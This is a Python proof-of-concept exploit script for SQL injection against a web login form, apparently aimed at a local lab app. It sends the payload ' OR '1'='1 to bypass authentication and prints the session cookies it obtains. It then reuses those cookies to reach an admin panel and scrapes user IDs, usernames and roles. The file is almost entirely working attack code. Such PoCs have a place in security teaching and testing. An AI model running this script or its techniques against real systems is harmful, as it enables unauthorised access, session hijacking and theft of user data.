#!/usr/bin/env python3

import requests
import sys

def sql_injection_poc(base_url):
    print("\n[*] SQL Injection Proof of Concept")
    print("[*] This PoC demonstrates bypassing authentication using SQL injection")
    
    # The vulnerable endpoint
    login_url = f"{base_url}/login"
    
    # Normal login attempt (should fail)
    print("\n[+] Attempting normal login with incorrect credentials...")
    normal_data = {
        "username": "admin",
        "password": "wrong_password"
    }
    
    response = requests.post(login_url, data=normal_data)
    if "Invalid credentials" in response.text:
        print("[+] Normal login correctly failed with invalid credentials")
    else:
        print("[!] Unexpected response for normal login")
    
    # SQL Injection payload
    print("\n[+] Attempting SQL injection bypass...")
    injection_data = {
        "username": "' OR '1'='1",  # Classic SQL injection payload
        "password": "anything"
    }
    
    response = requests.post(login_url, data=injection_data, allow_redirects=True)
    
    # Check if we were redirected to the profile page (successful login)
    if "/profile" in response.url:
        print("[!] SQL INJECTION SUCCESSFUL! Authentication bypassed.")
        print(f"[+] Redirected to: {response.url}")
        
        # Extract session cookie
        cookies = response.cookies
        if cookies:
            print("[+] Obtained session cookies:")
            for cookie in cookies:
                print(f"    {cookie.name}: {cookie.value}")
        
        # Check if we can access the admin page with these cookies
        admin_response = requests.get(f"{base_url}/admin", cookies=cookies)
        if "Admin Panel" in admin_response.text:
            print("[!] Successfully accessed admin panel using the stolen session!")
            
            # Extract some user data from the admin panel
            import re
            users = re.findall(r'ID: (\d+), Username: ([^,]+), Role: ([^<]+)', admin_response.text)
            if users:
                print("[+] Extracted user information:")
                for user_id, username, role in users:
                    print(f"    User ID: {user_id}, Username: {username}, Role: {role}")
    else:
        print("[-] SQL injection attempt failed - target might be patched")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    sql_injection_poc(base_url)